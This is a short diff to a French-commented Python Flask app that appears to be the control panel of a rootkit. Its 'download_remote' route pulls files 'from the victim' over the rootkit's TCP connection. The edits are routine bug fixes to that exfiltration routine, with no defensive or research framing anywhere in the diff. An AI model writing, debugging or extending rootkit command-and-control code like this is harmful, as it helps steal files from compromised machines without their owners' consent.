@@ -9,7 +9,7 @@ import os
 def download():
     # Liste les fichiers déjà téléchargés en local
     files = os.listdir(cfg.DOWNLOAD_FOLDER)
-    return render_template("download.html", files=files)
+    return render_template("download.html", files=files, download_folder=cfg.DOWNLOAD_FOLDER)
 
 # ---------------------- TÉLÉCHARGER UN FICHIER DEPUIS LA VICTIME ---------------------- #
 
@@ -30,15 +30,9 @@ def download_remote():
 
         # 2. Taille du fichier
         size = int(response.split()[1])
-        print(f"[DEBUG] Taille du fichier : " + size)
+        print(f"[DEBUG] Taille du fichier : " + str(size))
         print(f"[DEBUG] Envoi READY")
-        cfg.rootkit_connexion.send("READY", use_history=False, channel="tcp")
-
-        # 3. Réception
-        print(f"[DEBUG] Reception data")
-        data = cfg.rootkit_connexion.get_tcp_object()._network_handler.receive(
-            cfg.rootkit_connexion.get_tcp_object()._client_socket
-        )
+        data = cfg.rootkit_connexion.send("READY", use_history=False, channel="tcp")
 
         # 🔍 Correction ici : tester explicitement les échecs
         print(f"[DEBUG] IF")
